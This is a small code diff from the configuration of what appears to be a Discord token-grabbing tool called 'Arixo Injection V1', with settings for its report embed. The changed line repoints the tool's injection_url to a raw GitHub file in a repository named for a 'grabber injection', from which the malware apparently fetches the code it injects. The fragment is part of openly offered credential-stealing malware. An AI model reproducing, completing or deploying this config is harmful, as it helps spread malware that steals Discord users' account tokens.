@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Arixo Injection V1', 
   embed_icon: 'https://media.discordapp.net/attachments/941689660416086072/1246066906310643784/logodis.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com//index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/ArianPashae/Arixo-Grabber-Injection/master/injection-v1.js', 
   /**
    
    **/
